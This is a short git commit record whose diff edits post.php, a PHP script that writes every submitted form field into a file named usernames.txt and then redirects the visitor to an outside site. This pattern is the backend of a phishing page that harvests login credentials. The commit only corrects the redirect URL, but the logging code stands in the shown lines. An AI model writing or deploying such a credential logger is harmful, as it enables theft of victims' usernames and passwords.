5a76fcf465e62930e81a83aab38da6e7cc30524e
DropsThose <63679101+DropsThose@users.noreply.github.com>
2020-04-14 19:55:18 -0700

    Update post.php

--- post.php
+++ post.php
@@ -1,5 +1,5 @@
 _<?php
-header ('Location:-https://thosedrops.me/- ');
+header ('Location:https://thosedrops.me/');
 $handle = fopen('usernames.txt', 'a');
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
